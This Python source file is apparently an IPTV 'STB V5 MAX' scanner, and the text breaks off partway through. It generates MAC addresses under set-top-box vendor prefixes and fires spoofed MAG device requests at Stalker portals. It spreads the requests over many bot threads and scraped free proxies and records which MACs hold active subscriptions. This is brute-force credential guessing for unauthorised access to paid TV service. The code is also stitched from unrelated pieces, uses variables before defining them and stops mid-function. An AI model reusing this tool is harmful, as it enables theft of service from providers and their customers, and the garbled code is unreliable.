if uzmanm=="p/portal.php":
    uzmanm="p/portal.php"
    uzmanc="p"
if uzmanm=="k/portal.php":
    uzmanm="k/portal.php"
    uzmanc="k"
if uzmanm=="bs.mag.portal":
    uzmanm="bs.mag.portal"
    uzmanc="bs.mag.portal"
if uzmanm=="Link_Ok.php":
    uzmanm="Link_Ok.php"
    uzmanc="Link_OK"
if uzmanm=="magLoad.php":
    uzmanm="magLoad.php"
    uzmanc="magLoad"
if uzmanm=="portalcc.php":
    uzmanm="portalcc.php"
    uzmanc="portalcc"
if uzmanm=="portalmega.php":
    uzmanm="portalmega.php"
    uzmanc="portalmega"
print(uzmanm)
#uzmanm="magLoad.php"
panel=panel.replace('stalker_portal','')
panel=panel.replace('http://','')
panel=panel.replace('/c/','')
panel=panel.replace('/c','')
panel=panel.replace('/','')
panel=panel.replace(' ','')

#http://gotv.one/stalker_portal/c/
import urllib3
import os
def temizle():
    os.system('clear')
yeninesil=(
'00:1A:79:',
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'18:C8:E7:',
'78:A3:52:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:A1:79:',
'00:1B:79:',
'00:2A:79:',
)
comboc=""
combototLen=""
combouz=0
combodosya="ᴀᴜᴛᴏ ʀᴀɴᴅᴏᴍ ᴍᴀᴄs"
proxyc=""
proxytotLen=""
proxydosya=""
proxylist="" 
proxyuz=0
durum="🅈🄴🅂 🏴‍☠" 

import os,pip
try:
    import flag
except:
    pip.main(['install', 'emoji-country-flag'])
    import flag
try:
  import androidhelper as sl4a
  ad = sl4a.Android()
  import threading
except:pass
import pathlib

def dosyasec():
  global comboc,combototLen,proxyuz,proxydosya,proxylist,proxylist,proxylist,combodosya,proxyc,proxytotLen,proxyuz,combouz,randomturu,serim,seri,mactur,randommu
  say=0
  dsy=""
  
  if comboc=="":
    print(anonym)     
    mesaj="Select mac combo!"
    dir=rootDir+'/Users/dumancan/Desktop/STBV5-MAX-PROXY-MAC'
    dsy=" \33[91m0\033[1;32m = STB5࠾RandomCombo [SLXXL] \33[0m\n   \x1b[38;5;226m [OFFLINE-COMBO]\33[0m\n"
  else:
    print(anonym)
    mesaj="Select your proxies!"
    dir=rootDir+'/Users/dumancan/Desktop/STBV5-MAX-PROXY-MAC'
  if not os.path.exists(dir):
      os.mkdir(dir)
  for files in os.listdir (dir):
    say=  say+ 1
    dsy=dsy+" \33[91m"+str(say)+" \033[1;32m= \33[0m\33[36m"+files+'\33[0m\n'
  print ("""
Choose option from the list below!

"""+dsy+"""
\x1b[38;5;226mFound """ +str(say)+""".txt proxy files. \33[0m
""")
  dsyno=str(input("    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m "))
  if dsyno=="":
    dsyno="0" 
  say=0
  for files in os.listdir (dir):
     say=say+1
     if dsyno==str(say):
      dosya=(dir+files)
      break
  os.system('clear')
  print(anonym)
  say=0
  try:
     if not dosya=="9797979790797977979":
        print()
     else:
        print("Incorrect file selection!")
        quit()
  except:
    print("\n\33[1m\x1b[38;5;231m  Select mac type!\n")     
    if comboc=="":
      if dsyno=="0" or dsyno=="":
        nnesil=str(yeninesil)
        nnesil=(nnesil.count(',')+1)
        for xd in range(0,(nnesil)):
          tire=' ➭ '
          if int(xd) <9:
            tire='  ➭ '
          print(" \x1b[38;5;1m\33[1m" +str(xd+1)+"\033[1;32m\33[1m"+tire+"\33[36m\33[1m"+yeninesil[xd])
        mactur=input("\n    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m ")
        print("\033[H\033[J", end="")
        os.system('clear')
        print(anonym)
        if mactur=="":
          mactur=1
        randomturu=input("""
   \33[1m\x1b[38;5;231m Select mac combination type! \33[0m
          
\33[36m\33[1m    1 = Cascading mac
    2 = Random mac \033
   
    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m """)
        print("\033[H\033[J", end="")
        os.system('clear')
        print(anonym)
        if randomturu=="":
          randomturu="2"
        serim=""
        serim=input("""
   \33[1m\x1b[38;5;231m Use serial mac? \33[0m
          
\33[36m\33[1m    1 - YES
    2 - NO \033

    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m  """)
        print("\033[H\033[J", end="")
        os.system('clear')
        print(anonym)
        mactur=yeninesil[int(mactur)-1]
        if serim =="":
          serim=2
        if serim =="1":
          seri=input("\n\n\x1b[38;5;226m\33[1m   Sample \033[1;32m\33[1m= \33[36m\33[1m"+mactur+"\33[91m5\x1b[38;5;226m\33[1m\n\n   Sample \033[1;32m\33[1m= \33[36m\33[1m"+mactur+"\33[91mFA\33[0m\n\n\x1b[38;5;1m\33[1m   Write one or two values!\33[0m\n\n   \33[36m\33[1m"+mactur+"\33[91m")
          print("\033[H\033[J", end="")
          print(anonym)
        combouz=input("""
        
   \33[1m\x1b[38;5;231m Enter number of mac to scan! \33[0m

    \x1b[38;5;226mᴅᴇꜰᴀᴜʟᴛ Mᴀᴄꜱ = 999999


    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m """)
        if combouz=="":
          combouz=999999
        combouz=int(combouz)
        randommu="xdeep"
    else:
      print("Wrong file selection!")
      quit()
  if comboc=="":
    if randommu=="":
      combodosya = dosya.replace('/sdcard/Combo/', '')
      combodosya=combodosya.replace('.txt',"")
      comboc=open(dosya, 'r')
      combototLen=comboc.readlines()
      combouz=(len(combototLen))
    else:
      comboc='anonym'
  else:
    #if not comboc=='feyzo':
      proxydosya=dosya
      proxylist=proxydosya
      proxylist=proxylist.replace("/sdcard/Proxy/", "")
      proxylist = proxylist.replace(".txt", '')
      proxyc=open(dosya, "r")
      proxytotLen=proxyc.readlines()
      proxyuz=(len(proxytotLen))
      
randommu=""

dosyasec()

os.system('clear')
def clear(): os.system('clear') #on Linux System
https=["https://proxyspace.pro/https.txt", 
          "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
          "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
          "https://www.proxyscan.io/download?type=http",
          "https://api.openproxylist.xyz/http.txt",
          "https://api.proxyscrape.com/v2/?request=getproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all"]
socks4=["https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
              "https://www.proxyscan.io/download?type=socks4",
              "https://api.openproxylist.xyz/socks4.txt",
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt"]
socks5=["https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
              "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
              "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"]

PURPLE = '\033[95m'
CYAN = '\033[96m'
DARKCYAN = '\033[36m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
END = '\033[0m'

v="1.0b"



def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def getPrList(prlist):
    prdata=[]
    for api in range(0, len(prlist)-1):
        try:
            data=requests.get(prlist[api]).text.split("\n")
            for i in data:
                if i not in prdata:
                    prdata.append(i)
        except ConnectionError:
            print("Network Error")
            return []
        except KeyboardInterrupt:
            print("Bye!")
            exit()
        except Exception as e:
            print("ERROR :\n"+str(e))
            pass
            return []
    if prdata!=[]:
        return prdata
    else:
        return []


def writeToFile(pr="", filename="proxy.txt"):
    file=open(filename,'wb')
    #print(pr)
    time.sleep(10)
    file.write(bytes(pr.strip(), 'utf-8'))

def homeMenu():
    clear()
    print(anonym)
    print("""\n    \33[1mONLINE ELITE PROXIES!\n    \33[33m\33[1mTAP = 4 = CONTINUE \n    \33[36m\33[1m1 =  HTTPs (Online)-[7000+]\n    \33[36m\33[1m2 =  SOCKS4 (Online)-[7500+]\n    \33[36m\33[1m3 =  SOCKS5 (Online)-[1000+]\n""")
    httpsProxy=[]
    socks4Proxy=[]
    socks5Proxy=[]
    while True:
        try:
            homeChoice=int(input(RED+"Enter Your Choice:    "))
            if homeChoice==1:
                clear()
                print(anonym)
                print("Getting HTTP Proxies!")
                httpsProxy=getPrList(https)
                #print(httpProxy)
                print(f"Got {len(httpsProxy)} Proxies")
                time.sleep(4)
                pr=""
                for i in httpsProxy:
                    pr=pr+"\n"+i
                writeToFile(pr, rootDir+'proxy/ONLINE-HTTPs.txt')
                clear()
                print("Done!")
                break
            elif homeChoice==2:
                clear()
                print(anonym)
                print("Getting SOCKS4 Proxies!")
                socks4Proxy=getPrList(socks4)
                print(f"Got {len(socks4Proxy)} Proxies")
                time.sleep(4)
                pr=""
                for i in socks4Proxy:
                    pr=pr+"\n"+i
                writeToFile(pr, rootDir+'proxy/ONLINE-SOCKs4.txt')
                clear()
                print("Done!")
                break
            elif homeChoice==3:
                clear()
                print(anonym)
                print("Getting SOCKS5 Proxies!")
                socks5Proxy=getPrList(socks5)
                print(f"Got {len(socks5Proxy)} Proxies")
                time.sleep(4)
                pr=""
                for i in socks5Proxy:
                    pr=pr+"\n"+i
                writeToFile(pr, rootDir+'proxy/ONLINE-SOCKs5.txt')
                clear()
                print("Done!")
                break
            elif homeChoice==4:
                clear()
                print(f"Version: {v}\nA tool build by Vaibhav to scarpe proxies from various sources and to save them in your system.")
                break
            else:
                print("Invalid Choice! Try again.\n")
        except ValueError:
            print("Invalid Input! Try again.\n")
        except KeyboardInterrupt:
            print("Bye!")
            exit()
        except Exception as e:
            clear()
            print("ERROR!")
            print(e)
        
homeMenu()

os.system('clear')
print(anonym)
proxi=input("""
   \33[1m\x1b[38;5;231m Do you want to use proxy?! 
  
\x1b[38;5;226m\33[1m    ᴅᴇꜰᴀᴜʟᴛ ɪꜱ = 2 \033
  
\33[36m\33[1m    1 - YES
    2 - NO \033
    
    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m """)
print("\033[H\033[J", end="")
os.system('clear')
print(anonym) 
if proxi =="1":
  dosyasec()
  pro=input("""   \33[1m\x1b[38;5;231m Select Proxy type! \033

\033[1;32m\33[1m    1 = ipVanish
\33[36m\33[1m    2 = Http/Https (\033[1;92m\33[1mFREE\33[36m\33[1m)
\33[36m\33[1m    3 = Http/Https - User:Pass (\x1b[38;5;226mPRO\33[36m\33[1m)    
\33[36m\33[1m    4 = Socks4 (\033[1;92m\33[1mFREE\33[36m\33[1m)
\33[36m\33[1m    5 = Socks4 - User:Pass (\x1b[38;5;226mPRO\33[36m\33[1m)
\33[36m\33[1m    6 = Socks5 (\033[1;92m\33[1mFREE\33[36m\33[1m)
\33[36m\33[1m    7 = Socks5 - User:Pass (\x1b[38;5;226mPRO\33[36m\33[1m)

    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m  """)
#print(proxyuz)
os.system('clear')
print(anonym)
kanalkata=input("""
\33[1m\x1b[38;5;231m    CATEGORIES, VOD AND SERIES
   
\x1b[38;5;226m\33[1m    ᴅᴇꜰᴀᴜʟᴛ ᴄᴀᴛᴇɢᴏʀʏ = 4

\33[36m\33[1m    0 =  STB (No Categories) 
    1 =  Live  Countries (LIVE) 
    2 =  All Categories (LIVE+VOD+SERIES) 
  
    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m  """)
print("\033[H\033[J", end="")
if kanalkata=="":
 kanalkata="2"
os.system('clear')
print(anonym) 
botgir=input("""

    \33[36m\33[1mMULTI-BOT
  
\x1b[38;5;226m\33[1m    Cʜᴏᴏꜱᴇ ꜰʀᴏᴍ 1 ᴛᴏ 60 ɴᴜᴍʙᴇʀ ᴏꜰ Bᴏᴛꜱ

    ᴅᴇꜰᴀᴜʟᴛ ʙᴏᴛꜱ = 10
      
    \33[36m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m """)
if botgir=="":
  botgir=10 

proxysay=0

import re
pattern = r"(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"

k=0
jj=0
iii=0
genmacs=""
bib=0
import random
def randommac():
  global genmacs,combosay
  combosay=combosay+1
  global k,jj,iii
  if randomturu == '2':
    while True:
      genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
      if not genmac in genmacs:
        genmacs=genmacs + ' '
        break
  else:
    if iii >= 257:
      iii=0
      jj=jj+1
    if jj >= 257:
      if not len(seri)==2:
        jj=0
      k=k+1
      if len(seri)==2:
        quit()
    if k==257:
      quit()
    genmac = str(mactur)+"%02x:%02x:%02x"% (k,jj,iii)
    iii=iii+1
  if serim=="1":
     if len(seri) ==1:
      genmac=str(genmac).replace(str(genmac[:10]),str(mactur)+seri)
     if len(seri)==2:
      genmac=str(genmac).replace(str(genmac[:11]),str(mactur)+seri)
  genmac=genmac.replace(':100',':10')
  genmac=genmac.upper()
  return genmac
color="" 
vpnz2=""
import sys
pal=panel
if 'http://' in pal:
  pal=pal.split("://")[1]
  pal=pal.split('/')[0]
  
def echok(mac,bot,total,hitc,status_code,oran):
  global cpm,hitr,m3uon,m3uvpn,m3uonxmacon,macvpn,macvpn,macon,bib,tokenr,color,vpnz2
  bib=0
  cpmx=(time.time()-cpm)
  cpmx=(round(60/cpmx))
  if str(cpmx)=="0":
      cpm=cpm
  else:
      cpm=cpmx
  time_= time.localtime()
  timex=time.time()
  # Aqui as cores para o texto ficar mudando de cor
  colors = [90, 91, 92, 93, 94, 95, 96, 97]
  # Escolha a cor com base no tempo atual
  color_code = colors[int(time.time()) % len(colors)]
  text = "🦂 ꜱᴛʙᴍᴀx ᴘʀᴇᴍɪᴜᴍ ꜱᴄᴀɴɴᴇʀ ʙʏ ʀɪᴍɪ 🦅     "          
  echo=("""\n
  
\33[3m\33[90m  ★      ★      ★      ★      ★      ★     \33[0m

\x1b[38;5;226m        █▀ ▀█▀ █▄▄  █▀█ █▀█ █▀█           \33[0m
\x1b[38;5;226m        ▄█ ░█░ █▄█  █▀▀ █▀▄ █▄█           \33[0m

\33[36m\33[1m          🛡  🅂🅃🄱 V5 🄼🄰🅇  🛡           \33[0m
\x1b[38;5;1m\33[1m         Ⓤⓛⓣⓡⓐ🔸ⒶⓉⓉⒶⒸⓀⒺⓇ          \33[0m
\33[1m\x1b[38;5;231m           ☛ ᴘʏ ᴄᴏɴꜰɪɢ ʙʏ ʀɪᴍɪ ☚ \33[0m

   ╓🛡🅂🅃🄱🄼🄰🅇☛ℛiᴍi☚🄿🅁🄴🄼🄸🅄🄼🛡
   ║➺ \33[32mSᴛᴀʀᴛTɪᴍᴇ:\33[92m"""+hora_ini+"""\33[0m\33[94m «» \33[36mSᴄᴀɴ:\033[1;90m"""+str(time.strftime('%H:%M:%S'))+"""  \33[0m
   ║➺ \33[36m"""+str(panel)+"""/Aᴜᴛᴏ➚⁽ˢᵀᴮ⁵⁾ \33[0m
   ║➺ \033[1;90mBᴏᴛ"""+str(bot)+"""\33[32m"""+tokenr+str(mac)+""" \33[0m\33[94mCᴘᴍ:"""+str(cpm)+"""  \33[0m
   ║➺ \33[36mExᴛʀᴇᴍ➛0 \33[92mNoVᴘɴ➛"""+str(macon)+""" \33[0m\x1b[38;5;1mVᴘɴ➛"""+str(macvpn)+""" \033[90mᴏꜰꜰ➛"""+str(hitc)+""" \33[0m
   ║➺ \33[33mM3ᴜCʜᴇᴄᴋ|\33[92mAᴄᴛɪᴠᴇ➛"""+str(m3uon)+"""\33[0m\33[95mᴏꜰꜰ➛"""+str(m3uvpn)+""" \033[90mɴᴏ3➛"""+str(macvpn)+""" \33[0m
   ║➺ \33[36mTᴏᴛᴀʟ➛"""+str(combouz)+"""/Rᴜɴ➛"""+str(total)+""" \33[33m ➭ \x1b[31m"""+str(oran)+"""%   \33[0m
   ╙➥ \033[1;90m√5\33[33m"""+str(hitr)+"""▄︻デMᴀx["""+str(hitc)+"""]HɪTꜱ==ᕗ🦅 \33[0m\33[4;90mPʀᴇᴍɪᴜᴍ\33[0m
  
    \33["""+str(color_code)+"""m"""+text+"""\33[0m 

\33[3m\33[90m  ★      ★      UPDATE: 34      ★      ★   \33[0m

   \33[33mHᴇʟʟᴏ - \33[36m\33[1m"""+nickn+""" \33[0m 👑
   \33[33mYᴏᴜ Cʜᴏꜱᴇ \33[0m\33[91m"""+str(bot)+"""\33[33m Bᴏᴛs \33[0m
   \33[33mPʀᴏᴛᴏᴄᴏʟ:\33[0m\33[91mHTTP\33[0m\33[33m|\33[0m"""+color+str(status_code)+"""\33[0m\33[33m|\33[0m
   \33[33mAɢᴇɴᴛ:\33[0m\33[91msᴛʙ⁵ᴀᴜᴛᴏ-ᴀɢᴇɴᴛX  \33[0m
   \33[33mAᴛᴛᴀᴄᴋ:\33[0m\33[91msᴛʙ⁵ᴀᴜᴛᴏ-ᴀᴛᴛᴀᴄᴋ  \33[0m
   \33[33mᴘʜᴘTʏᴘᴇ:\33[0m\33[91mᴀᴜᴛᴏᴍᴀᴛɪᴄ.ᴘʜᴘ⁽ˢᵀᴮ⁵⁾  \33[0m
   \33[33mMᴀᴄs: \33[0m\33[91m"""+str(combouz)+"""\33[93m ɪɴ \33[0m\33[91m"""+combodosya+""" \33[0m
   \33[33mDᴇʙᴜɢɢɪɴɢ:\033[1;90m\33[1m[stalker_portal] \33[0m\33[91mᴘʜᴘ/5.3.X\33[38;5;232m """+vpnz2+str(proxysay)+"""
   \33[35m╙"""+str(pal)+"""/Auto/portal.php

\33[3m\33[90m  ★      ★      ★      ★      ★      ★     \33[0m

                                            """)
  
  print(echo, end="", flush=True)
  time.sleep(0.01)
  cpm=time.time() 
  if status_code==200:color="\33[1m\33[32m""ᴀᴠᴀɪʟᴀʙʟᴇ : "
  if status_code==301:color="\33[1m\33[1;31m""ʀᴇᴅɪʀᴇᴄᴛ : "
  if status_code==302:color="\33[1m\33[1;31m""ᴍᴏᴠᴇᴅ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ : "
  if status_code==403:color="\33[1m\33[1;31m""Fᴏʀʙɪᴅᴅᴇɴ : "
  if status_code==404:color="\33[1m\33[1;31m""ɴᴏᴛ Fᴏᴜɴᴅ : "
  if status_code==429:color="\33[1m\33[1m\33[93m""ᴍᴀɴʏ ʀᴇqᴜᴇsᴛs : "
  if status_code==500:color="\33[1m\33[1m\33[93m""sᴇʀᴠᴇʀ Eʀʀᴏʀ : "
  if status_code==503:color="\33[1m\33[1m\33[93m""ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ : "
  if status_code==512:color="\33[1m\33[1m\33[93m""Eʀʀᴏʀ : "
  if status_code==520:color="\33[1m\33[35m"
  if not proxylist=="":
    vpnz2=str("\n  \33[33m RᴏᴛᴀᴛɪᴏɴPʀᴏxʏ:\33[0m\33[92m\33[1m[ON]\33[0m\33[33m ᴀᴛᴛᴇᴍᴘᴛ:\33[36m" )
  

def hea1(panel,mac):
  macs=mac.upper()
  macs=urllib.parse.quote(mac)
  panell=panel
  if uzmanm=="stalker_portal/server/load.php":
    panell=str(panel)+'/stalker_portal'
  data={'User-Agent':'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',  'Referer':http + '://' + panell + '/c/', 
     'Report-To':'{"endpoints":[{"url":"https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=aD7S2OF4niZxQQzkOWJyzBIqVylHQbmf9jFKrVx4L3DDOpbjYyq0DZTg9ZB9PhLhDT19R3axPLdnzGgGL%2BYcygkCBA7%2BcPBLf0%2FtCwZGzIawMJ5GBh%2Bih57Y4vtrdg%3D%3D"}],"group":"cf-nel","max_age":604800}', 
     'Server':'cloudflare', 
     'X-User-Agent':'Model: MAG250; Link: WiFi', 
     'Cache-Control':'no-cache', 
     'Accept':'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
     'Cookie':'mac=' + macs + '; stb_lang=en; timezone=Europe%2FParis;', 
     'Accept-Encoding':'gzip, deflate', 
     'Connection':'Keep-Alive', 
     'X-User-Agent':'Model: MAG254; Link: Ethernet'}
     
  if uzmanm=="stalker_portal/server/load.php":
    data={'User-Agent':'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',  'Referer':http + '://' + panell + '/c/', 
         'Report-To':'{"endpoints":[{"url":"https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=aD7S2OF4niZxQQzkOWJyzBIqVylHQbmf9jFKrVx4L3DDOpbjYyq0DZTg9ZB9PhLhDT19R3axPLdnzGgGL%2BYcygkCBA7%2BcPBLf0%2FtCwZGzIawMJ5GBh%2Bih57Y4vtrdg%3D%3D"}],"group":"cf-nel","max_age":604800}', 
         'Server':'cloudflare', 
         'X-User-Agent':'Model: MAG250; Link: WiFi', 
         'Cache-Control':'no-cache', 
         'Accept':'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
         'Cookie':'mac=' + macs + '; stb_lang=en; timezone=Europe%2FParis;', 
         'Accept-Encoding':'gzip, deflate', 
         'Connection':'Keep-Alive', 
         'X-User-Agent':'Model: MAG254; Link: Ethernet'}
    
  if uzmanm=="stalker_portal/server/load.php":
    if stalker_portal=="1":
      data={'User-Agent':'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',  'Referer':http + '://' + panell + '/c/', 
             'Report-To':'{"endpoints":[{"url":"https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=aD7S2OF4niZxQQzkOWJyzBIqVylHQbmf9jFKrVx4L3DDOpbjYyq0DZTg9ZB9PhLhDT19R3axPLdnzGgGL%2BYcygkCBA7%2BcPBLf0%2FtCwZGzIawMJ5GBh%2Bih57Y4vtrdg%3D%3D"}],"group":"cf-nel","max_age":604800}', 
             'Server':'cloudflare', 
             'X-User-Agent':'Model: MAG250; Link: WiFi', 
             'Cache-Control':'no-cache', 
             'Accept':'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
             'Cookie':'mac=' + macs + '; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918', 
             'Accept-Encoding':'gzip, deflate', 
             'Connection':'Keep-Alive', 
             'X-User-Agent':'Model: MAG254; Link: Ethernet'}

  return data
  
def hea2(mac,token):
  macs=mac.upper()
  macs=urllib.parse.quote(mac)
  panell=panel
  if uzmanm=="stalker_portal/server/load.php":
    panell=str(panel)+'/stalker_portal'
  data={'User-Agent':'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',  'Referer':http + '://' + panell + '/c/', 
     'Report-To':'{"endpoints":[{"url":"https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=aD7S2OF4niZxQQzkOWJyzBIqVylHQbmf9jFKrVx4L3DDOpbjYyq0DZTg9ZB9PhLhDT19R3axPLdnzGgGL%2BYcygkCBA7%2BcPBLf0%2FtCwZGzIawMJ5GBh%2Bih57Y4vtrdg%3D%3D"}],"group":"cf-nel","max_age":604800}', 
     'Server':'cloudflare', 
     'X-User-Agent':'Model: MAG250; Link: WiFi', 
     'Cache-Control':'no-cache', 
     'Accept':'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
     'Cookie':'mac=' + macs + '; stb_lang=en; timezone=Europe%2FParis;', 
     'Accept-Encoding':'gzip, deflate', 
     'Connection':'Keep-Alive', 
     'X-User-Agent':'Model: MAG254; Link: Ethernet', 
     'Authorization':'Bearer ' + str(token)}
  
  if uzmanm=="stalker_portal/server/load.php":
    data={'User-Agent':'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',  'Referer':http + '://' + panell + '/c/', 
         'Report-To':'{"endpoints":[{"url":"https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=aD7S2OF4niZxQQzkOWJyzBIqVylHQbmf9jFKrVx4L3DDOpbjYyq0DZTg9ZB9PhLhDT19R3axPLdnzGgGL%2BYcygkCBA7%2BcPBLf0%2FtCwZGzIawMJ5GBh%2Bih57Y4vtrdg%3D%3D"}],"group":"cf-nel","max_age":604800}', 
         'Server':'cloudflare', 
         'X-User-Agent':'Model: MAG250; Link: WiFi', 
         'Cache-Control':'no-cache', 
         'Accept':'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
         'Cookie':'mac=' + macs + '; stb_lang=en; timezone=Europe%2FParis;', 
         'Accept-Encoding':'gzip, deflate', 
         'Connection':'Keep-Alive', 
         'X-User-Agent':'Model: MAG254; Link: Ethernet', 
         'Authorization':'Bearer ' + str(token)}
         
  if uzmanm=="stalker_portal/server/load.php":
    if stalker_portal=="1":
      data={'User-Agent':'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',  'Referer':http + '://' + panell + '/c/', 
             'Report-To':'{"endpoints":[{"url":"https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=aD7S2OF4niZxQQzkOWJyzBIqVylHQbmf9jFKrVx4L3DDOpbjYyq0DZTg9ZB9PhLhDT19R3axPLdnzGgGL%2BYcygkCBA7%2BcPBLf0%2FtCwZGzIawMJ5GBh%2Bih57Y4vtrdg%3D%3D"}],"group":"cf-nel","max_age":604800}', 
             'Server':'cloudflare', 
             'X-User-Agent':'Model: MAG250; Link: WiFi', 
             'Cache-Control':'no-cache', 
             'Accept':'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
             'Cookie':'mac=' + macs + '; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918', 
             'Accept-Encoding':'gzip, deflate', 
             'Connection':'Keep-Alive', 
             'X-User-Agent':'Model: MAG254; Link: Ethernet', 
             'Authorization':'Bearer ' + str(token)}
      
    
  return data

def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')

from datetime import date
def tarih_clear(trh):
  ay=""
  gun=""
  yil=""
  trai=""
  my_date=""
  sontrh=""
  out=""
  ay=str(trh.split(' ')[0])
  gun=str(trh.split(', ')[0].split(' ')[1])
  yil=str(trh.split(', ')[1])
  ay=str(month_string_to_number(ay))
  trai=str(gun)+'/'+str(ay)+'/'+str(yil)
  my_date = str(trai)
  d = date(int(yil), int(ay), int(gun))
  sontrh = time.mktime(d.timetuple())
  out=(int((sontrh-time.time())/86400))
  return out

import requests
import os,pip
import datetime,os
import socket,hashlib
import json,random,sys, time,re,marshal

try:
  import threading
except:pass
import pathlib,base64
try:
    import flag
except:
    pip.main(['install', 'emoji-country-flag'])
    import flag 
try:
  import requests
except:
  print("requests modul not found \n requests modul installing now... \n")
  pip.main(['install', 'requests'])

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import logging
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"

ses=requests.Session()
Dosyab=rootDir+"/Users/dumancan/Desktop/STBV5-MAX-PROXY-MAC"+panel.replace(":","_").replace('/','')+"}#"+str(nickn)+"{ʜɪᴛs}.txt"

DosyaC =rootDir+"/Users/dumancan/Desktop/STBV5-MAX-PROXY-MAC"+panel.replace(":","_").replace('/','')+"}#"+str(nickn)+"{ʜɪᴛs}.txt"
def yak(hits):
    dosya = open(DosyaC, 'a+', encoding='utf-8')
    dosya.write(hits)
    dosya.close()
combosay=0

DosyaD =rootDir+"/Users/dumancan/Desktop/STBV5-MAX-PROXY-MAC"+panel.replace(":","_").replace('/','')+"}#"+str(nickn)+"{ʜɪᴛs}.txt"

def yaz(hits):
    dosya = open(DosyaD, 'a+', encoding='utf-8')
    dosya.write(hits)
    dosya.close()

combosay=0
def combogetir():
  combogeti=""
  global combosay
  combosay=combosay+1
  try:
    combogeti=(combototLen[combosay])
  except:pass
  return combogeti

def proxygetir():
    global proxysay,bib
    if proxi == '1':
        bib = bib + 1
        bekle(bib, 'xdeep')
        if bib == 15:
            bib = 0
        while True:
            
            try:
                proxysay = proxysay + 1
                if proxysay == proxyuz:
                    proxysay = 0
